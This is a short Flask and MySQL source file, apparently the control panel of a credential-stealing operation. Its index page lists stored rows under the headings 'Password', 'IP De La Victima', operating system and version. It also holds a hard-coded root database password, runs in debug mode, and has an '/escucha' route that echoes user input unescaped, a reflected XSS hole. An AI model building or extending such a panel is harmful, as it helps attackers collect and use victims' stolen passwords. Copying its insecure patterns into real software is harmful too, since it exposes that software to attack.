from flask import Flask, render_template, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = '1598753'
app.config['MYSQL_DB'] = 'parisi'
mysql = MySQL(app)

headings = ("Password","IP De La Victima","Sistema Operativo","Version")

@app.route("/")
def index():
    cur = mysql.connect.cursor()
    cur.execute('select * from parisi')
    data = cur.fetchall()
    return render_template("index.html", headings = headings, data = data)


@app.route("/escucha")
def escucha():
    name = request.args.get('name')
    return "Requested for name = %s" % name

if __name__ == "__main__":
    app.run(
        debug=True,
        
        )
